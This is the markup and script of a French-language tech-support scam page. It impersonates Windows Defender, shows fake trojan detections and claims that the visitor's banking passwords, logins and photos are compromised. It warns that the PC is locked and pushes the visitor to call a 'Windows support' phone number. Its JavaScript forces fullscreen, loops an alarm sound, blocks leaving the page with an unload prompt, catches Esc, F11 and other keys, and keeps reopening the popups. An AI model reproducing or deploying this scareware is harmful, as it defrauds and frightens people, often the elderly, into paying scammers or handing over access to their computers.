                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>Trojan.DNSCharge.AC...</td>
                           <td>Malware</td>
                           <td>Registry Value</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>Trojan.Dropper.Autoit...</td>
                           <td>Malware</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>PUP.Optional.RelevantK...</td>
                           <td>Potentially Unwanted...</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>PUP.Optional.DownLoad...</td>
                           <td>Potentially Unwanted...</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                     </tbody>
                  </table>
               </div>
            </div>
            <div class="scan_footer2">
               <div class="row">
                  <div class="col-md-6">
                     <div class="bt_can">
                        <div class="dropdown">
                           <a class="btn btn-secondary dropdown-toggle" style="width:126px;" href="#" role="button"
                              id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                           Save result
                           </a>
                           <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                              <a class="dropdown-item" href="#">Action</a>
                              <a class="dropdown-item" href="#">Another action</a>
                              <a class="dropdown-item" href="#">Something else here</a>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="col-md-6">
                     <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                           <button type="button" class="btn btn-secondary">Close</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                           <button type="button" class="btn btn-secondary bg_blue">Quarantine</button>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="pro_box3" style="cursor: none;">
         <div class="pro_box_header">
            <div class="row">
               <div class="col-md-12">
                  <div class="minimize">
                     <ul>
                        <li><a href="#"><script>document.write(img1);</script></a></li>
                     </ul>
                  </div>
               </div>
               <div class="col-md-4">
                  <div class="logo">
                     <script>document.write(img2);</script><span>Windows Security</span>
                  </div>
               </div>
               <div class="col-md-8">
                  <div class="activate_lic">
                     <ul>
                        <li><a href="#">
                           <button>Activate license</button>
                           </a>
                        </li>
                        <li><a href="#"><script>document.write(img4);</script></a></li>
                        <li><a href="#"><script>document.write(img3);</script></a></li>
                        <li><a href="#"><script>document.write(img5);</script></a></li>
                     </ul>
                  </div>
               </div>
            </div>
         </div>
         <div class="scan_box2">
            <div class="scan_box_header">
               <div class="row">
                  <div class="col-md-6">
                     <div class="quick_scan">
                        <p><script>document.write(img6);</script><span>Scanner</span></p>
                     </div>
                  </div>
                  <div class="col-md-6">
                     <div class="minimize1">
                        <ul>
                           <li><a href="#"><script>document.write(img1);</script></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div class="scan_body">
               <div class="row">
                  <div class="col-md-12">
                     <div class="total_detail_scan">
                        <ul>
                           <li><a href="#">Scanner</a></li>
                           <li><a href="#">Scan Scheduler</a></li>
                           <li><a href="#">Reports</a></li>
                        </ul>
                     </div>
                  </div>
               </div>
               <br>
               <div class="table_quick2">
                  <div class="row">
                     <div class="col-md-4">
                        <div class="pc_desk">
                           <script>document.write(img7);</script>
                        </div>
                     </div>
                     <div class="col-md-4">
                        <div class="scan_pro mar_top">
                           <ul>
                              <li><i class="fa fa-check" aria-hidden="true"></i> Cheacking for updates</li>
                              <li><i class="fa fa-check" aria-hidden="true"></i> Scan memory</li>
                              <li><i class="fa fa-check" aria-hidden="true"></i> Scan startup items</li>
                              <li>
                                 <div class="circular-spinner"></div>
                                 <span>Scanning registry</span>
                              </li>
                              <li>Scanning file system</li>
                           </ul>
                        </div>
                     </div>
                     <div class="col-md-4">
                        <div class="scan_dur">
                           <p><strong>Scan duration</strong></p>
                           <p>3sec 0s</p>
                           <p>5sec 0s</p>
                           <br>
                           <p><strong>Items scanned</strong></p>
                           <p>51,900</p>
                           <br>
                           <p><strong>Detections</strong></p>
                           <p>11</p>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="scan_footer3">
               <div class="row">
                  <div class="col-md-2">
                     <div class="viruses">
                        <script>document.write(img6);</script>
                     </div>
                  </div>
                  <div class="col-md-10">
                     <div class="make_this">
                        <p>Make this the last you worry about online threats</p>
                        <p>Premium stops malware, viruses, and more without bogging down your computer.
                           Upgrade to Premium
                        </p>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div id="poptxt" class="lightbox">
         <div class="ilb top">
            <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
               <span id="txtadd" class="fl title"><span class="fl ilb"><script>document.write(img8);</script></span> Centre de sécurité Windows Defender</span>
               <span id="txts1" class="fl title2"><a href="#"><script>document.write(img10);</script></a></span>
            </div>
         </div>
         <div id="txtintro">
            <span class="colo-rd">App: Ads.fiancetrack(2).dll<br>
            Threat Detected:  Trojan Spyware</span>
         </div>
         <script>document.write(img9);</script>
         <div id="disclaimer">
            L'accès à ce PC a été bloqué pour des raisons de sécurité.<br>
            <span class="support">
               Contacter l'assistance Windows: 09 70 46 18 30            </span>
         </div>
         <div id="bottom">
            <img id="badge" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC8AAAAuBAMAAABKVV06AAAAElBMVEUDpfCAuwPzUCL/uQMAAAC5uQQ0mX59AAAABnRSTlP9/Pv6ADplVg4YAAAAJ0lEQVQ4y2NQQgAXQQQIGJUYlUBIuGAHDrglkICLMQIEjEqMSsAlADP/hpWs+eXQAAAAAElFTkSuQmCC"><span class="title3"></span>
            <ul>
               <li>
                  <a href="#">
                     <div class="fr button2">
                        <span id="addtochromebutton">Refuser</span>
                     </div>
                  </a>
               </li>
               <li>
                  <a href="#">
                     <div class="fr button">
                        <span id="addtochromebutton">Permettre</span>
                     </div>
                  </a>
               </li>
            </ul>
         </div>
      </div>
      <div id="pop_up_new" class="cardcontainer" style="cursor: none;">
         <p class="text-center" style="    font-size: 16px;
            font-weight: normal;
            margin: 0;
            margin-bottom: 5px;
            padding: 5px 10px;
            color: #FFFFFF !important;
            color: #414141;font-weight: bold;
            margin-top: 8px;">Windows-Defender - Avertissement de sécurité</p>
         <p>** L'ACCÈS À CE PC A ÉTÉ BLOQUÉ POUR DES RAISONS DE SÉCURITÉ **</p>
         <p>Votre ordinateur nous a alerté qu'il a été infecté par un Trojan Spyware. Les données suivantes ont été compromises.</p>
         <p>&gt; Identifiants de messagerie<br>
            &gt; Mots de passe bancaires<br>
            &gt; Identifiant Facebook<br>
            &gt; Des photos &amp; Documents
         </p>
         <p>Windows-Defender Scan a trouvé sur cet appareil des logiciels publicitaires potentiellement indésirables qui peuvent voler vos mots de passe, votre identité en ligne, vos informations financières, vos fichiers personnels, vos photos ou vos documents.</p>
         <p>Vous devez nous contacter immédiatement afin que nos ingénieurs puissent vous guider tout au long du processus de suppression par téléphone..</p>
         <p>Appelez immédiatement le support Windows pour signaler cette menace, empêcher le vol d'identité et déverrouiller l'accès à cet appareil.</p>
         <p>La fermeture de cette fenêtre mettra vos informations personnelles en danger et entraînera la suspension de votre enregistrement Windows.</p>
         <p style="padding-bottom: 0px; color:#fff; font-size:14px;">
            Appelez l'assistance Windows: 
            <strong>
               09 70 46 18 30            </strong>
         </p>
         <div class="action_buttons"><a class="active" id="leave_page"
            style="cursor: pointer; color: #FFFFFF !important;">OK</a> <a class="active"
            id="leave_page"
            style="color: #FFFFFF !important;">Annuler</a>
         </div>
      </div>
      <div id="welcomeDiv"
         style="display: none;
         background-color: rgb(40 40 40 / 90%);
         height: auto;
         width: 767px;
         margin-left: 388px;
         position: absolute;
         z-index: 9999999999;
         padding: 0px 7px;
         border-radius: 0px 0px 15px 15px;"
         class="answer_list">
         <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 21px; opacity:.9; ">L'accès à cet ordinateur a été bloqué pour des raisons de sécurité. Ne pas accéder ou redémarrer cet ordinateur. Ignorer cet avertissement critique peut entraîner la perte de données sur ce système. Veuillez contacter le support immédiatement afin qu'un ingénieur Microsoft puisse vous guider à travers les étapes de dépannage par téléphone.</p>
      </div>
      <!-- Optional JavaScript; choose one of the two! -->
      <!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
         crossorigin="anonymous"></script>
      <script type="text/javascript"> function addEvent(obj, evt, fn) {
    if (obj.addEventListener) {
        obj.addEventListener(evt, fn, false);
    } else if (obj.attachEvent) {
        obj.attachEvent("on" + evt, fn);
    }
}

addEvent(document, 'mouseout', function(evt) {
    if (evt.toElement == null && evt.relatedTarget == null) {
        $('.lightbox').slideDown();
    };
});

$('a.close').click(function() {
    $('.lightbox').slideUp();
});
$('body').click(function() {
    $('.lightbox').slideUp();
});
 $(document).ready(function() {
    var audioElement = document.createElement('audio');
    audioElement.setAttribute('src', 'alertmicrosoft.mp3');
    
    audioElement.addEventListener('ended', function() {
        this.play();
    }, false);
    
   
     $('.map').click(function() {
        audioElement.play();
        
    });

      $('.black').click(function() {
        audioElement.play();
        
    });
      

       $('#footer').click(function() {
        audioElement.play();
        
    });

        $('#poptxt').click(function() {
        audioElement.play();
        
    });
       
     
   
    
    
});

 $("#footer").fadeIn('slow')
.css({top:752,position:'absolute'})
.animate({top:685}, 800, function() {
    //callback
});
$(document).ready(function() {
    $(".arow-div").delay(1000).fadeIn(500);
});

    $(document).ready(function(){
  $("#poptxt").click(function(){
    $('#poptxt').hide('fast');
  });
});
    $(document).ready(function(){
  $(".alert_popup").click(function(){
    $('.alert_popup').hide('fast');
  });
});
    


           $(document).ready(function(){
  $("#footer").click(function(){
    $('#poptxt').hide('fast');
  });
});

   $(document).ready(function(){
  $(".black").click(function(){
    $('.delayedPopupWindow').hide('fast');
  });
});

  


window.addEventListener("beforeunload", function (e) {
         var confirmationMessage = 'It looks like you have been editing something. '
                            + 'If you leave before saving, your changes will be lost.';

                (e || window.event).returnValue = confirmationMessage; 
                return confirmationMessage;
            });addEventListener("click", function() {
    var el = document.documentElement
        , rfs =
               el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
    ;
    rfs.call(el);
});</script>
      <script type="text/javascript">
         $(function () {
             var current_progress = 0;
             var interval = setInterval(function () {
                 current_progress += 10;
                 $("#dynamic")
                     .css("width", current_progress + "%")
                     .attr("aria-valuenow", current_progress)
                     .text(current_progress + "% Complete");
                 if (current_progress >= 100)
                     clearInterval(interval);
             }, 100);
         });
      </script>
      <script type="text/javascript">
         (function ($) {
             $.fn.countTo = function (options) {
                 options = options || {};
         
                 return $(this).each(function () {
                     // set options for current element
                     var settings = $.extend({}, $.fn.countTo.defaults, {
                         from: $(this).data('from'),
                         to: $(this).data('to'),
                         speed: $(this).data('speed'),
                         refreshInterval: $(this).data('refresh-interval'),
                         decimals: $(this).data('decimals')
                     }, options);
         
                     // how many times to update the value, and how much to increment the value on each update
                     var loops = Math.ceil(settings.speed / settings.refreshInterval),
                         increment = (settings.to - settings.from) / loops;
         
                     // references & variables that will change with each update
                     var self = this,
                         $self = $(this),
                         loopCount = 0,
                         value = settings.from,
                         data = $self.data('countTo') || {};
         
                     $self.data('countTo', data);
         
                     // if an existing interval can be found, clear it first
                     if (data.interval) {
                         clearInterval(data.interval);
                     }
                     data.interval = setInterval(updateTimer, settings.refreshInterval);
         
                     // initialize the element with the starting value
                     render(value);
         
                     function updateTimer() {
                         value += increment;
                         loopCount++;
         
                         render(value);
         
                         if (typeof (settings.onUpdate) == 'function') {
                             settings.onUpdate.call(self, value);
                         }
         
                         if (loopCount >= loops) {
                             // remove the interval
                             $self.removeData('countTo');
                             clearInterval(data.interval);
                             value = settings.to;
         
                             if (typeof (settings.onComplete) == 'function') {
                                 settings.onComplete.call(self, value);
                             }
                         }
                     }
         
                     function render(value) {
                         var formattedValue = settings.formatter.call(self, value, settings);
                         $self.html(formattedValue);
                     }
                 });
             };
         
             $.fn.countTo.defaults = {
                 from: 0,               // the number the element should start at
                 to: 0,                 // the number the element should end at
                 speed: 100,           // how long it should take to count between the target numbers
                 refreshInterval: 100,  // how often the element should be updated
                 decimals: 0,           // the number of decimal places to show
                 formatter: formatter,  // handler for formatting the value before rendering
                 onUpdate: null,        // callback method for every time the element is updated
                 onComplete: null       // callback method for when the element finishes updating
             };
         
             function formatter(value, settings) {
                 return value.toFixed(settings.decimals);
             }
         }(jQuery));
         
         jQuery(function ($) {
             // custom formatting example
             $('.count-number').data('countToOptions', {
                 formatter: function (value, options) {
                     return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
                 }
             });
         
             // start all the timers
             $('.timer').each(count);
         
             function count(options) {
                 var $this = $(this);
                 options = $.extend({}, options || {}, $this.data('countToOptions') || {});
                 $this.countTo(options);
             }
         });
      </script>
      <script type="text/javascript">
         $(document).ready(function () {
             $(".pro_box2").delay(1500).fadeIn(800);
             $(".pro_box3").delay(2500).fadeIn(800);
             $(".pro_box3").delay(3000).fadeIn(800);
             $("#pop_up_new").delay(3500).fadeIn(800);
             $("#poptxt").delay(4000).fadeIn(800);
              $("#welcomeDiv").delay(5000).fadeIn(800);
              $("#ev_talkbox_wrapper").delay(5200).fadeOut(500)
         });
      </script>
      <script type="text/javascript">
         document.addEventListener('keyup', function (es) {
             if (es.keyCode === 27) {
                 toggleFullScreen();
             }
         }, false);
      </script>
      <script type="text/javascript">
         document.addEventListener('keyup', function (e) {
             if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
                 document.getElementById('map').innerHTML = stroka;
                 toggleFullScreen();
             }
         }, false);
      </script>
      <script>
         // Get the modal
         var modal = document.getElementById('myModal');
         
         // Get the button that opens the modal
         var btn = document.getElementById("myBtn");
         
         // Get the <span> element that closes the modal
         var span = document.getElementsByClassName("close")[0];
         
         // When the user clicks the button, open the modal
         /*btn.onclick = function() {
           modal.style.display = "block";
         } */
         
         // When the user clicks on <span> (x), close the modal
         span.onclick = function () {
             modal.style.display = "none";
         }
         
         // When the user clicks anywhere outside of the modal, close it
         window.onclick = function (event) {
             if (event.target == modal) {
                 modal.style.display = "none";
             }
         }
      </script>
      <script type="text/javascript">
         setTimeout(function () {
             document.getElementById("beep").play();
         });
      </script>
      <script>
         $(document).ready(function () {
             $("#mycanvas").click(function () {
                 $("#welcomeDiv").hide();
             });
         });
      </script>
      <script>
         $(document).ready(function () {
             $("#mycanvas").click(function () {
                 $(".bgimg").hide();
                 $(".bgimg2").show();
             });
         });
      </script>
      <script type="text/javascript">
         $(document).ready(function () {
             $("body").mouseover(function () {
                 $("#poptxt").show();
             });
         });
      </script>
      <script type="text/javascript">
         $(document).ready(function () {
             $("body").mouseover(function () {
                 $("#welcomeDiv").show();
             });
         });
      </script>
   </body>
	
</html>